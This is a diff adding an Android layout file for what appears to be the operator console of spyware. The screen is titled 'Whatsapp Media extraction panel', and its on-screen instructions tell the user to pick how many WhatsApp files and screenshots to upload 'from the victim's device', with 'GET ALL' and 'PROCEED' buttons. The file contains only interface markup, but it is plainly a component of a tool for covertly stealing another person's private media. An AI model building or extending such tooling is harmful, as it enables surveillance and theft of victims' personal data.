@@ -1,0 +1,98 @@
+<?xml version="1.0" encoding="utf-8"?>
+<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="wrap_content"
+    xmlns:app="http://schemas.android.com/apk/res-auto">
+
+    <TextView
+        android:id="@+id/text"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:maxLines="1"
+        android:layout_alignParentTop="true"
+        android:gravity="center_horizontal"
+        android:layout_marginTop="15dp"
+        android:ellipsize="end"
+        android:textColor="#000"
+        android:textStyle="bold"
+        android:fontFamily="@font/roboto"
+        android:text="Whatsapp Media extraction panel"
+        android:textAllCaps="true"
+        android:textSize="17sp"/>
+
+    <TextView
+        android:id="@+id/payload_h"
+        android:layout_below="@id/text"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:fontFamily="@font/roboto"
+        android:layout_marginHorizontal="10dp"
+        android:layout_marginTop="5dp"
+        android:textColor="#6B6B6B"
+        android:textAlignment="center"
+        android:text="Select the number of WhatsApp files to upload from the victim's device and then click upload. If the number of files is less than the selected number then all files will be uploaded.Click all to get all screenshots."
+        android:textSize="14sp"/>
+
+
+    <com.sdsmdg.harjot.crollerTest.Croller
+        android:id="@+id/croller"
+        android:layout_below="@id/payload_h"
+        android:layout_width="match_parent"
+        android:layout_height="300dp"
+        android:elevation="7dp"
+        android:layout_centerInParent="true"
+        android:layout_marginTop="15dp"
+        app:back_circle_color="#EDEDED"
+        app:indicator_color="#0B3C49"
+        app:indicator_width="10"
+        app:is_continuous="true"
+        app:main_circle_color="#FFFFFF"
+        app:max="1000"
+        app:progress_primary_circle_size="10"
+        app:progress_primary_color="#0B3C49"
+        app:progress_primary_stroke_width="5"
+        app:progress_secondary_circle_size="5"
+        app:progress_secondary_color="#EDEDED"
+        app:progress_secondary_stroke_width="5"
+        app:start_offset="45"/>
+
+    <TextView
+        android:id="@+id/payl"
+        android:layout_below="@id/croller"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:layout_marginHorizontal="10dp"
+        android:layout_marginTop="5dp"
+        android:layout_marginBottom="25dp"
+        android:textColor="#1A1A1A"
+        android:textAlignment="center"
+        android:textAllCaps="true"
+        android:textStyle="bold"
+        android:text="Total 0 files will be uploaded"
+        android:textSize="14sp"/>
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:layout_below="@id/payl"
+        android:orientation="horizontal">
+        <androidx.appcompat.widget.AppCompatButton
+            android:id="@+id/getAll"
+            android:layout_width="0dp"
+            android:layout_height="60dp"
+            android:background="#fff"
+            android:text="GET ALL"
+            android:layout_weight="1"/>
+
+        <androidx.appcompat.widget.AppCompatButton
+            android:id="@+id/proceed"
+            android:layout_width="0dp"
+            android:layout_height="60dp"
+            android:background="#009688"
+            android:textColor="#fff"
+            android:text="PROCEED"
+            android:layout_weight="1"/>
+
+    </LinearLayout>
+
+</RelativeLayout>
